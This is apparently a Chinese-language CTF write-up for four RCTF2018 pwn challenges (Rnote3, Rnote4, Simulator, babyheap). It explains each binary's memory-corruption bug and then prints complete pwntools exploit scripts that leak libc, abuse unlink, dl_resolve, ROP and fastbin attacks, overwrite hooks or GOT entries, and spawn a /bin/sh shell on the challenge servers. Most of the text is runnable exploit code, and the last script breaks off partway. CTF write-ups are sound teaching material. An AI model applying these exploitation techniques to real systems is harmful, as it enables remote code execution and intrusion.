5/24/2018 11:25:55 PM 

# RCTF2018 PWN #
# Rnote #
## 1.题目分析 ##
典型的菜单题目，漏洞点位于delete_note()中，对ptr指针没有进行初始化。因此，该指针保存了之前函数对该栈地址（ebp-x018）赋值过后的值。  
存在漏洞函数如下所示：  
![漏洞点](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/1.PNG)  
保护机制如下：  
![保护机制](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/2.PNG)  
## 2.漏洞利用 ##
### 利用方法1: UAF+Unlink ###
创建堆块如下所示：

	payload = 'AAAAAA'
	ru('Exit\n')
	add_note('a',0x28,payload)
	add_note('d',0x28,payload)
	add_note('b',0x88,payload)
	add_note('c',0x88,payload)
	add_note('f',0x88,payload)

#### Step 1: 泄露libc地址 ####
首先通过show\_note()函数对之后想要释放的堆块进行定位，然后调用delete\_note()函数，传入一个当前不存在的title值，此时程序遍历当前note列表，无法找到对应title的note，因此就不会对ptr指针进行更新，默认释放了之前show_note()函数对该栈地址设定的值。并且对note\_list进行清空时，i=32，note\_list[32]=0。 
 
	step 1: leak libc
	show_note('c')
	rl()
	delete_note('ccc')
	show_note('\x00')
	ru('content: ')
	top_addr = u64(rv(6).ljust(8,'\x00'))
	lg('top_addr',top_addr)
	libc.address = top_addr - 0x58 - 0x3C4B20
	lg('libc_addr',libc.address)
一个需要注意的点是，保存note结构的chunk是一个fastbin，当对该fastbin进行free后，如果该fastbin是对应fastbin链表中第一个被释放的，fd位置会被清0，而fd的位置正好保存了title值。因此查找时不应该查找原title值，应该查找'\x00'。
#### Step 2: 泄露堆地址 ####
方法与lead libc相同，不同的在于，需要释放一个conten也为fastbin大小（0x30）的note。然后申请一个content大小为smallbin大小的note，将刚才释放的note结构（0x20）申请回来。再次释放一个content大小为fastbin大小（0x30）的note，此时0x30大小的fastbin空闲链表中就有2个chunk，其中第一个chunk的fd字段就为一个heap地址，并且0x20大小的fastbin空闲链表中只有一个chunk（note结构），其fd字段为0。

	step 2: leak heap_addr
	add_note('c',0x88,payload)
	
	show_note('a')
	rl()
	delete_note('ccc')
	add_note('e',0x88,payload)
	show_note('d')
	rl()
	delete_note('ccc')
	show_note('\x00')
	ru('content: ')
	heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
	lg('heap_addr',heap_addr)
#### Step 3: 触发unlink，修改free_hook为system ####
通过堆布局，使两个smallbin（content）在堆空间布局上连续。然后释放相邻的两个smallbin，并再次申请一个content大小为0x90（大于0x88即可）的note结构。覆写下一个chunk的presize和size字段，然后释放下一个chunk，出发unlink。  
之后覆写free_hook为system，成功实现利用。  
### 利用方法2:UAF+Fastbin Attack ###
未完待续。。。。。
## 3.expolit代码 ##
    from pwn import *
    from ctypes import *
    import os
    #import roputils as rop
    
    remote_addr = "rnote3.2018.teamrois.cn"
    remote_port = 7322
    
    local_addr = "127.0.0.1"
    local_port = 1807
    
    pc = "./RNote3"
    pwn_elf = ELF(pc)
    pwn_rop = rop.ROP(pc)
    
    uselibc = 2 #0 for no,1 for i386,2 for x64
    local = 0
    haslibc = 1
    atta = 0
    
    if uselibc == 2:
    	context.arch = "amd64"
    else:
    	context.arch = "i386"
    
    if uselibc ==2 and haslibc == 0:
    	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    else:
    	if uselibc == 1 and haslibc == 0:
    		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    	else:
    		libc = ELF('./libc.so.6')
    
    if local == 1:
    	if haslibc:
    		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
    	else:
    		p = process(pc)
    elif local == 0:
    	p = remote(remote_addr,remote_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    else:
    	p = remote(local_addr,local_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    
    context.log_level = True
    
    if local:
    	if atta:
    		gdb.attach(p,'b *0x555555554000+0x0000000000001109')
    		#b *0x0804887F \n 
    		#0x400b6a
    
    def ru(a):
    	return p.recvuntil(a)
    
    def sn(a):
    	p.send(a)
    
    def rl():
    	return p.recvline()
    
    def sl(a):
    	p.sendline(a)
    
    def rv(a):
    	return p.recv(a)
    
    def raddr(a,l=None):
    	if l == None:
    		return u64(rv(a).ljust(8,'\x00'))
    	else:
    		return u64(rl().strip('\n').ljust(8,'\x00'))
    
    def lg(s,addr):
    	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    
    def sa(a,b):
    	p.sendafter(a,b)
    
    def sla(a,b):
    	p.sendlineafter(a,b)
    	
    def add_note(title,size,content):
    	sl('1')
    	sla('title: ',title)
    	sla('size: ',str(size))
    	sla('content: ',content)
    
    def show_note(title):
    	sl('2')
    	sla('title: ',title)
    
    
    def edit_note(title,content):
    	sl('3')
    	sla('title: ',title)
    	sla('content: ',content)
    
    def delete_note(title):
    	sl('4')
    	sla('title: ',title)
    
    def hack():
    	raw_input()
    	payload = 'AAAAAA'
    	ru('Exit\n')
    	add_note('a',0x28,payload)
    	add_note('d',0x28,payload)
    	add_note('b',0x88,payload)
    	add_note('c',0x88,payload)
    	add_note('f',0x88,payload)
    	
    	# step 1: leak libc
    	show_note('c')
    	rl()
    	delete_note('ccc')
    	show_note('\x00')
    	ru('content: ')
    	top_addr = u64(rv(6).ljust(8,'\x00'))
    	lg('top_addr',top_addr)
    	libc.address = top_addr - 0x58 - 0x3C4B20
    	lg('libc_addr',libc.address)
    
    	# step 2: leak heap_addr
    	add_note('c',0x88,payload)
    	
    	show_note('a')
    	rl()
    	delete_note('ccc')
    	add_note('e',0x88,payload)
    	show_note('d')
    	rl()
    	delete_note('ccc')
    	show_note('\x00')
    	ru('content: ')
    	heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
    	lg('heap_addr',heap_addr)
    
    	# step 3: unlink overwrite free_hook
    	add_note('h',0x18,'AAAAA')
    	show_note('e')
    	rl()
    	delete_note('ccc')
    	delete_note('f')
    	delete_note('b')
    	fake_fd = heap_addr + 0xc0 - 0x18
    	fake_bk = heap_addr + 0xc0 - 0x10
    	payload = p64(0) + p64(0x81) + p64(fake_fd) + p64(fake_bk)
    	payload = payload.ljust(0x80,'A')
    	payload += p64(0x80) + p64(0x90) + p64(0) + p64(0)
    	add_note('g',0x90,payload)
    	add_note('i',0x70,'AAAAA')
    	delete_note('c')
    
    	show_note('\x00')
    	rl()
    	delete_note('ccc')
    
    	free_hook = libc.symbols['__free_hook']
    	lg('free_hook',free_hook)
    	payload = p64(0x21) + p64(0x67) + p64(0x90) + p64(free_hook)
    	edit_note('g',payload)
    	#one_gadget = libc.address + 0xf02a4
    	system_addr = libc.symbols['system']
    	payload = p64(system_addr)
    	edit_note('g',payload)
    
    	add_note('aaa',0x18,'/bin/sh\0')
    	delete_note('aaa')
    	p.interactive()
    
    hack()


# Rnote4 #
## 1.题目分析 ##
在edit_note()函数中存在简单粗暴的堆溢出漏洞，关键在于如何利用，程序无任何能泄露地址的地方。  
存在漏洞点如下图所示:  
![漏洞点](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/RNote4/picture/1.PNG)  
保护机制中，No PIE，No RELRO。
## 2.漏洞利用 ##
可以发现程序没有开启基地址随机化，并且可覆写GOT表。因此考虑采用dl_resolve改写free_got为system地址，然后调用free函数，实现利用。
### 2.1 改写ELF文件头的dynamic节的strtab字段 ###
改写strtab字段值为一个可控的内存区域。
### 2.2 伪造strtab ###
改写strtab中"free"字符串偏移处为"system"。
### 2.3 改写free_got ###
改写free\_got为free\_plt+0x6，使其执行dl_resolve。
## 3.expolit代码 ##
    from pwn import *
    from ctypes import *
    import os
    #import roputils as rop
    
    remote_addr = "rnote4.2018.teamrois.cn"
    remote_port = 6767
    local_addr = "127.0.0.1"
    local_port = 1807
    
    pc = "./RNote4"
    pwn_elf = ELF(pc)
    
    uselibc = 2 #0 for no,1 for i386,2 for x64
    local = 0
    haslibc = 0
    atta = 0
    
    if uselibc == 2:
    	context.arch = "amd64"
    else:
    	context.arch = "i386"
    
    if uselibc ==2 and haslibc == 0:
    	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    else:
    	if uselibc == 1 and haslibc == 0:
    		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    	else:
    		libc = ELF('./libc.so.6')
    
    if local == 1:
    	if haslibc:
    		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
    	else:
    		p = process(pc)
    elif local == 0:
    	p = remote(remote_addr,remote_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    else:
    	p = remote(local_addr,local_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    
    context.log_level = True
    
    if local:
    	if atta:
    		gdb.attach(p,'b *0x0000000000400A85')
    		#b *0x0804887F \n 
    		#0x400b6a
    
    def ru(a):
    	return p.recvuntil(a)
    
    def sn(a):
    	p.send(a)
    
    def rl():
    	return p.recvline()
    
    def sl(a):
    	p.sendline(a)
    
    def rv(a):
    	return p.recv(a)
    
    def raddr(a,l=None):
    	if l == None:
    		return u64(rv(a).ljust(8,'\x00'))
    	else:
    		return u64(rl().strip('\n').ljust(8,'\x00'))
    
    def lg(s,addr):
    	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    
    def sa(a,b):
    	p.sendafter(a,b)
    
    def sla(a,b):
    	p.sendlineafter(a,b)
    	
    def add_note(size,content):
    	sn('\x01')
    	sn(chr(size))
    	sn(content)
    
    def edit_note(index,size,content):
    	sn('\x02')
    	sn(chr(index))
    	sn(chr(size))
    	sn(content)
    
    def delete_note(index):
    	sn('\x03')
    	sn(chr(index))
    
    def hack():
    	raw_input()
    	dynamic_strtab = 0x0000000000601EA8
    	strtab = 0x00000000004003F8
    	str_free = 0x0000000000400457
    	str_free_offset = str_free - strtab
    
    	free_got = pwn_elf.got['free']
    	free_plt = 0x0000000000400620
    
    	lg('free_plt',free_plt)
    	lg('free_got',free_got)
    	
    	add_note(0x10,'A'*0x10)
    	add_note(0x10,'A'*0x10)
    	add_note(0x30,'A'*0x30)
    
    	payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0) + p64(dynamic_strtab)
    	edit_note(1,0x30,payload)
    
    	data = 0x601400
    	payload = p64(5) + p64(data)
    	edit_note(2,0x10,payload)
    
    	payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0) + p64(data)
    	edit_note(1,0x30,payload)
    	
    	payload = '\x00'*str_free_offset + 'system\x00'
    	edit_note(2,str_free_offset+7,payload)
    	
    	payload = p64(0) + p64(0) + p64(0) + p64(0x21) + p64(0) + p64(free_got)
    	edit_note(1,0x30,payload)
    	
    	payload = p64(free_plt+0x6)
    	edit_note(2,8,payload)
    	
    	payload = '/bin/sh\0'
    	edit_note(1,8,payload)
    	delete_note(1)
    	p.interactive()
    
    hack()


# Simulator #
## 1.题目分析 ##
MIPS模拟器，支持12条MIPS基本指令，提供了32个整数寄存器，以及0x1000大小的.data段和0x1000大小的.text段。其中寄存器及指令相关信息如下所示。

### Descripion of register： ###
**zeor**  
**at**  
**v0~v1**  
**a0~a3**  
**t0~t7**  
**s0~s7**  
**t8~t9**  
**k0~k1**  
**gp**  
**sp**  
**fp**  
**ra**  
共32个寄存器。

### Descripion of instruction： ###
#### 1.li ####
load immeadiate  
**opcode:0x21**  
operand 1: register  
operand 2: immediate  
#### 2.lw ####
load word  
**opcode:0x23**  
operand 1: register  
operand 2: register/memory_label  
#### 3.sw ####
store word  
**opcode:0x2B**  
operand 1: register  
operand 2: register  
#### 4.move ####
**opcode:0x06**  
operand 1: register  
operand 2: register  
#### 5.beq ####
**opcode:0x04**  
operand 1: register  
operand 2: register  
operand 3: offset  
#### 6.j(jmp) ####
jmp   
**opcode:0x02**  
operand 1: offset  
#### 7.Arithmetic instructions ####
**opcode:0x20  ins\_func:add  
opcode:0x22  ins\_func:sub  
opcode:0x24  ins\_func:and  
opcode:0x25  ins\_func:or  
opcode:0x2a  ins\_func:slt**  
operand 1: register/imm  
operand 2: register/imm  
operand 3: register/imm  
#### 8.syscall ####
**opcode:0x0c**  
function: if(v0==1) printf value of a0。  


### 程序漏洞点: ###
1.add，sub函数存在数组下标越界，其中参数a1既可以是一个寄存器也可以是一个立即数。如果是一个立即数，则其大小只要在int范围内均可。  
![漏洞点1](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/simulator/picture/1.PNG)  
2.lw，sw函数存在数组下标越界，由于程序中比较的方法为有符号数的比较（jle），因此可以采用负数来进行绕过。  
![漏洞点2](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/simulator/picture/3.PNG)  
3.栈溢出漏洞，可结合前两个漏洞。修改\_\_stack\_chk\_fail的got表为ret地址，然后进行rop（可采用**dl_resolve**和**DynEym**两种方法）。  
![漏洞点3](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/simulator/picture/4.PNG)
## 2.漏洞利用 ##
### 2.1 覆写stack\_chk\_fail的GOT表为RET地址 ###
#### Method 1: ####
使用sub或and指令
  
	# Method 1： use add/sub
	change_2_text()
	offset = ((stack_chk_fail_got - register_val) & 0xffffffff )/8-0x20
	print hex(offset) 
	code = 'add '+str(offset)+','+str(leave_ret)+','+str(0)
	input_code(code)
#### Method 2: ####
使用lw和sw指令，在这主要是用sw指令进行覆写。使用lw指令进行信息泄露的原理与其类似。

	# Method 2: use lw/sw
	change_2_text()
	code = 'li $t0,' + str(leave_ret)
	input_code(code)
	offset = (stack_chk_fail_got - mapp0 - 4)/8 + 0xE0000000
	print hex(offset)
	code = 'li $t1,' + str(offset)
	input_code(code)
	code = 'sw $t0,$t1'
	input_code(code)
	sl('END')
一个需要注意的点就是在计算offset时，由于必须保证`t1<=0x400`，且mapp0的值是小于stack\_chk\_fail\_got的。
因此必须是t1的值必须为一个负值，且满足等式要求使其高位被舍去。
#### 注意点： ####
使用这两种方法实现任意地址读写时，有一个限制条件。即：这里的任意地址其实不是严格意义上的任意地址，该地址必须以0x4或者0xC结尾，即无法对0x0或者0x8结尾的地址内容进行读写。
### 2.2 栈溢出利用 ###
#### Method 1: dl\_2\_resolve ####
直接使用roputils进行dl\_resolve的构造，唯一需要注意的点就是程序中没有read函数，可使用fgets函数进行代替。但fgets函数的第三个参数为stdin，需要先进行leak。

	# step 2: leak the value of stdin
	offset = 0x30
	payload = pwn_rop.retfill(offset)
	payload += p32(puts_plt) + p32(pop_ret) + p32(stdin_addr)
	payload += p32(vul_func)
	sla('comment: ',payload)
	stdin_addr = u32(rv(4))
	lg('stdin_addr',stdin_addr)

	# step 3: dl_resolve
	sl('END')
	payload = pwn_rop.retfill(offset)
	payload += pwn_rop.call(fgets_plt, addr_bss, 100, stdin_addr)
	payload += pwn_rop.dl_resolve_call(addr_bss + 20, addr_bss)
	sla('comment: ',payload)

	payload = pwn_rop.string('/bin/sh')
	payload += pwn_rop.fill(20, payload)
	payload += pwn_rop.dl_resolve_data(addr_bss + 20, 'system')
	payload += pwn_rop.fill(100, payload)
	sl(payload)

#### Method 2: DynELF ####
使用puts函数构造的leak函数如下所示。  

    def leak(address,length=4):
    	global data
    	sl('END')
    	#tmp = rl()
    	#print 'tmp' + tmp
    	if(address%0x100 == 0xa):
    		address = address + 1
    	payload = 'A'*0x30
    	payload += p32(puts_plt) + p32(pop_ret) + p32(address)
    	payload += p32(vul_func)
    	sla('comment: ',payload)
    	up = ''
    	buf = ''
    	while True:
    		c = p.recv(numb=1, timeout=1)
    		#count += 1
    		if up == '\n' and c == "":
    			buf = buf[:-1]
    			buf += "\x00"
    			break
    		else:
    			buf += c
    		up = c
    	data = buf[:4]
    	print "%#x => %s" % (address, (data or '').encode('hex'))
    	return data
由于puts函数的输出无法指定输出字节数，因此考虑使用recv函数timeout特性，逐字节的读取输出内容。然后判断上一次的输出是否为一个'\n'，当前输出是否为一个'\0'来鉴定puts函数是否已经完成输出。  
计算得到system函数地址后，就是普通的ROP调用过程，使用fgets写入'/bin/sh'，然后进行调用。  
## 3.exploit代码 ##
### 3.1 使用dl_resolve AC代码 ###
    from pwn import *
    from ctypes import *
    import os
    import roputils as rop
    from hashlib import sha256
    
    remote_addr = "simulator.2018.teamrois.cn"
    remote_port = 3131
    
    local_addr = "127.0.0.1"
    local_port = 1807
    
    pc = "./simulator"
    pwn_elf = ELF(pc)
    pwn_rop = rop.ROP(pc)
    
    
    uselibc = 1 #0 for no,1 for i386,2 for x64
    local = 1
    haslibc = 0
    atta = 0
    
    if uselibc == 2:
    	context.arch = "amd64"
    else:
    	context.arch = "i386"
    
    if uselibc ==2 and haslibc == 0:
    	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    else:
    	if uselibc == 1 and haslibc == 0:
    		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    	else:
    		libc = ELF('./libc.so.6')
    
    if local == 1:
    	if haslibc:
    		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
    	else:
    		p = process(pc)
    elif local == 0:
    	p = remote(remote_addr,remote_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    else:
    	p = remote(local_addr,local_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    
    context.log_level = True
    
    if local:
    	if atta:
    		gdb.attach(p,'b *0x0804AF3B')
    		#b *0x0804887F \n 
    		#0x400b6a
    
    def ru(a):
    	return p.recvuntil(a)
    
    def sn(a):
    	p.send(a)
    
    def rl():
    	return p.recvline()
    
    def sl(a):
    	p.sendline(a)
    
    def rv(a):
    	return p.recv(a)
    
    def raddr(a,l=None):
    	if l == None:
    		return u64(rv(a).ljust(8,'\x00'))
    	else:
    		return u64(rl().strip('\n').ljust(8,'\x00'))
    
    def lg(s,addr):
    	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    
    def sa(a,b):
    	p.sendafter(a,b)
    
    def sla(a,b):
    	p.sendlineafter(a,b)
    
    def change_2_data():
    	sl('.data')
    
    def change_2_text():
    	sl('.text')
    
    def input_data(data):
    	payload = 'pop_ret' + ' ' + str(pop_ret)
    	sl(payload)
    	sl(data)
    
    def input_code(code):
    	sl(code)
    
    def fuckingsha256():
    	chal = rl().strip('\n')
    	for i0 in range(0x100):
    		for i1 in range(0x100):
    			for i2 in range(0x100):
    				for i3 in range(0x100):
    					sol = chr(i0)+chr(i1)+chr(i2)+chr(i3)
    					if(sha256(chal + sol).digest().startswith('\0\0\0')):
    						return sol
    
    def hack():
    	raw_input()
    
    	if local == 0:
    		res = fuckingsha256()
    		sl(res)
    	fgets_got = pwn_elf.got['fgets']
    	fgets_plt = pwn_elf.plt['fgets']
    	puts_plt = pwn_elf.plt['puts']
    	stack_chk_fail_got = pwn_elf.got['__stack_chk_fail']
    	addr_bss = pwn_rop.section('.bss') + 0x200
    	
    	vul_func = 0x08048680
    	stdin_addr = 0x0804D080
    	leave_ret = 0x0804AC56
    	register_val = 0x0804DA24
    	pop_ret = 0x08048545
    	ppp_ret = 0x0804b339
    	mapp0 = 0x4000000
    	# step 1: overwrite __stack_chk_fail's got to the address of ret
    	
    	# Method 1: use add/sub
    	# change_2_text()
    	# offset = ((stack_chk_fail_got - register_val) & 0xffffffff )/8-0x20
    	# print hex(offset) 
    	# code = 'add '+str(offset)+','+str(leave_ret)+','+str(0)
    	# input_code(code)
    	# sl('END')
    	
    	# Method 2: use lw/sw
    	change_2_text()
    	code = 'li $t0,' + str(leave_ret)
    	input_code(code)
    	offset = (stack_chk_fail_got - mapp0 - 4)/8 + 0xE0000000
    	print hex(offset)
    	code = 'li $t1,' + str(offset)
    	input_code(code)
    	code = 'sw $t0,$t1'
    	input_code(code)
    	sl('END')
    
    	# step 2: 
    	# Method 1: use dl_resolve
    	
    	# step 2.1: leak the value of stdin
    	offset = 0x30
    	payload = pwn_rop.retfill(offset)
    	payload += p32(puts_plt) + p32(pop_ret) + p32(stdin_addr)
    	payload += p32(vul_func)
    	sla('comment: ',payload)
    	stdin_addr = u32(rv(4))
    	lg('stdin_addr',stdin_addr)
    
    	# step 2.2: dl_resolve
    	sl('END')
    	payload = pwn_rop.retfill(offset)
    	payload += pwn_rop.call(fgets_plt, addr_bss, 100, stdin_addr)
    	payload += pwn_rop.dl_resolve_call(addr_bss + 20, addr_bss)
    	sla('comment: ',payload)
    
    	payload = pwn_rop.string('/bin/sh')
    	payload += pwn_rop.fill(20, payload)
    	payload += pwn_rop.dl_resolve_data(addr_bss + 20, 'system')
    	payload += pwn_rop.fill(100, payload)
    	sl(payload)
    	
    	p.interactive()
    
    hack()
### 3.2 使用DynElf AC代码 ###
    from pwn import *
    from ctypes import *
    import os
    import roputils as rop
    from hashlib import sha256
    
    remote_addr = "simulator.2018.teamrois.cn"
    remote_port = 3131
    
    local_addr = "127.0.0.1"
    local_port = 1807
    
    pc = "./simulator"
    pwn_elf = ELF(pc)
    pwn_rop = rop.ROP(pc)
    
    
    uselibc = 1 #0 for no,1 for i386,2 for x64
    local = 0
    haslibc = 0
    atta = 0
    
    if uselibc == 2:
    	context.arch = "amd64"
    else:
    	context.arch = "i386"
    
    if uselibc ==2 and haslibc == 0:
    	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    else:
    	if uselibc == 1 and haslibc == 0:
    		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    	else:
    		libc = ELF('./libc.so.6')
    
    if local == 1:
    	if haslibc:
    		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
    	else:
    		p = process(pc)
    elif local == 0:
    	p = remote(remote_addr,remote_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    else:
    	p = remote(local_addr,local_port)
    	if haslibc:
    		libc = ELF('./libc.so.6')
    
    context.log_level = True
    
    if local:
    	if atta:
    		gdb.attach(p,'b *0x0804AA49')
    		#b *0x0804887F \n 
    		#0x400b6a
    
    def ru(a):
    	return p.recvuntil(a)
    
    def sn(a):
    	p.send(a)
    
    def rl():
    	return p.recvline()
    
    def sl(a):
    	p.sendline(a)
    
    def rv(a):
    	return p.recv(a)
    
    def raddr(a,l=None):
    	if l == None:
    		return u64(rv(a).ljust(8,'\x00'))
    	else:
    		return u64(rl().strip('\n').ljust(8,'\x00'))
    
    def lg(s,addr):
    	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    
    def sa(a,b):
    	p.sendafter(a,b)
    
    def sla(a,b):
    	p.sendlineafter(a,b)
    
    puts_plt = pwn_elf.plt['puts']
    vul_func = 0x0804AB88
    pop_ret = 0x08048545
    data = ''
    
    def leak(address,length=4):
    	global data
    	sl('END')
    	#tmp = rl()
    	#print 'tmp' + tmp
    	if(address%0x100 == 0xa):
    		address = address + 1
    	payload = 'A'*0x30
    	payload += p32(puts_plt) + p32(pop_ret) + p32(address)
    	payload += p32(vul_func)
    	sla('comment: ',payload)
    	up = ''
    	buf = ''
    	while True:
    		c = p.recv(numb=1, timeout=1)
    		#count += 1
    		if up == '\n' and c == "":
    			buf = buf[:-1]
    			buf += "\x00"
    			break
    		else:
    			buf += c
    		up = c
    	data = buf[:4]
    	print "%#x => %s" % (address, (data or '').encode('hex'))
    	return data
    
    def change_2_data():
    	sl('.data')
    
    def change_2_text():
    	sl('.text')
    
    def input_data(data):
    	payload = 'pop_ret' + ' ' + str(pop_ret)
    	sl(payload)
    	sl(data)
    
    def input_code(code):
    	sl(code)
    
    def fuckingsha256():
    	chal = rl().strip('\n')
    	for i0 in range(0x100):
    		for i1 in range(0x100):
    			for i2 in range(0x100):
    				for i3 in range(0x100):
    					sol = chr(i0)+chr(i1)+chr(i2)+chr(i3)
    					if(sha256(chal + sol).digest().startswith('\0\0\0')):
    						return sol
    
    def hack():
    	raw_input()
    
    	if local == 0:
    		res = fuckingsha256()
    		sl(res)
    	fgets_got = pwn_elf.got['fgets']
    	fgets_plt = pwn_elf.plt['fgets']
    	puts_plt = pwn_elf.plt['puts']
    	strncmp_got = pwn_elf.got['strncmp']
    	strncmp_plt = pwn_elf.plt['strncmp']
    	mmap_got = pwn_elf.got['mmap']
    	stack_chk_fail_got = pwn_elf.got['__stack_chk_fail']
    	addr_bss = pwn_rop.section('.bss') + 0x200
    	
    	vul_func = 0x08048680
    	stdin_addr = 0x0804D080
    	leave_ret = 0x0804AC56
    	register_val = 0x0804DA24
    	pop_ret = 0x08048545
    	ppp_ret = 0x0804b339
    	mapp0 = 0x4000000
    	ret = 0x0804852e
    
    	# step 1: overwrite __stack_chk_fail's got to the address of ret
    	
    	# Method 2: use lw/sw
    	change_2_text()
    	code = 'li $t0,' + str(leave_ret)
    	input_code(code)
    	offset = (stack_chk_fail_got - mapp0 - 4)/8 + 0xE0000000
    	print hex(offset)
    	code = 'li $t1,' + str(offset)
    	input_code(code)
    	code = 'sw $t0,$t1'
    	input_code(code)
    
    	# step 2: 
    	# Method 2: use DynELF
    	d = DynELF(leak, elf=ELF('./simulator'))
    	system_addr = d.lookup('system', 'libc')
    	lg('system_addr',system_addr)
    	libc.address = system_addr - u32(data)
    	lg('libc_addr',libc.address)
    	
    	# leak the value of stdin
    	sl('END')
    	payload = 'A'*0x30
    	payload += p32(puts_plt) + p32(pop_ret) + p32(stdin_addr)
    	payload += p32(vul_func)
    	sla('comment: ',payload)
    	stdin_addr = u32(rv(4))
    	lg('stdin_addr',stdin_addr)
    
    	# execute system('/bin/sh')
    	sl('END')
    	sh_addr = addr_bss
    	payload = 'A'*0x30 + p32(fgets_plt) + p32(ppp_ret) + p32(sh_addr) + p32(8) + p32(stdin_addr)
    	payload += p32(system_addr) + p32(vul_func) + p32(sh_addr)
    	sla('comment: ',payload)
    	sl('/bin/sh\0')
    	p.interactive()
    
    hack()
# babyheap #
## 1.题目分析 ##
off by null的极限利用。  
存在漏洞的函数位置如下所示：
![漏洞点](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/picture/babyheap_vulpos.png)  
**利用思路为off by null + fastbin attack**  
## 2.漏洞利用 ##
### 2.1 leak libc地址 ###
本题的难点在于如何利用off by null来泄露libc的基地址。  
假设有A，B，C，D四个块，其排列如下所示：  
A || B || C || D
首先将B释放，然后利用A出发off by null漏洞，修改B的size字段（注：对B size字段的修改只能将其最后一个字节修改为0x00，同时程序所能申请的最大大小小于0x100，因此需要将B申请为0x110大小的chunk，这样在覆写后其大小变为0x100，达到修改的目的）。  

同时由于将B的chunk size由0x110修改为0x100，如果再次对B进行分配，会首先调用unlink将B从smallbin链表中拆除，此时会检查B的next chunk的presize是否等于B的size，具体检查位置如图所示：  
![unlink_check1](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/picture/unlink_presize.PNG)
因此在对B进行填充时，需要将B的最后16个字节填充为（0x00000100，0x00000021）。  

然后申请B1（0xa0），B2（0x60），此时内存中的对款布局如下所示：  
A || B1 || B2 || R || C || D  
其中R为一个0x10大小的剩余块（其内容就为p64(0x100)+p64(0x21))。

然后释放C，释放B1，此时就会将B1，B2，C合并为一个大的堆块E，堆块布局如下所示：  
A || B1 || B2 || R || C || D  
A ||  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  E &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|| D  

然后再次申请0xa0大小的一个chunk C1，此时会从E中进行分配，剩余chunk E1和chunk B2发生了重叠，我们可以通过打印B2的值，泄露出top\_chunk的地址，堆块布局如下所示：    
A || C1 || &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;E1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|| D  
结果如下所示：  
![show_libc](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/picture/show_libc.PNG)  
### 2.2 利用fastbin attack ###
这里只有一个需要注意的点就是不能连续对同一个fastbin chunk进行释放，但如果在两次释放中夹杂一次其他chunk（同样大小）的释放则可以。  

修改malloc\_hook地址为one\_gadget。  
注意fastbin attack利用过程中会对chunk的size字段进行检查，看其是否属于当前fastbin链表。绕过方法为：错位对齐和fastbin索引计算的不精确性（64bit：右移4位，32bit：右移3位）。  

另一个需要注意的地方是使用one\_gadget的一个技巧。  
由于execve（\*filename，\*argv[]，\*env[]）的第二个参数为一个指向命令行的指针数组，因此要么使其为NULL，要么使其为一个可读且不影响程序执行的地址。在本题中，如果直接将malloc\_hook修改为one\_gadget是无法成功的，由于该指针指向了一个不可读的地址。因此可以将malloc\_hook修改为realloc()地址（该函数中有sub rsp,0xAA操作，可以将argv指向一个可读的位置），然后将realloc\_hook修改为one\_gadget即可。  
利用结果如下图所示：  
![fastbin attack](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/picture/fastbinattack.PNG)  
然后再次申请一个chunk，即可调用"/bin/sh"。
## 3.expolit代码 ##
    from pwn import *
    from ctypes import *
    import os
    #import roputils as rop
    
    remote_addr = "babyheap.2018.teamrois.cn"
    remote_port = 3154
    local_addr = "127.0.0.1"
    local_port = 1807
    
    pc = "./babyheap"
    pwn_elf = ELF(pc)
    pwn_rop = rop.ROP(pc)
    
    uselibc = 2 #0 for no,1 for i386,2 for x64
    local = 1
    haslibc = 1
    atta = 1
    
    if uselibc == 2:
    	context.arch = "amd64"
    else:
    	context.arch = "i386"
    
    if uselibc ==2 and haslibc == 0:
    	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    else:
    	if uselibc == 1 and haslibc == 0:
    		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    	else:
    		libc = ELF('./libc.so.6')
    
    if local == 1:
    	if haslibc:
    		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
    	else:
    		p = process(pc)
    elif local == 0:
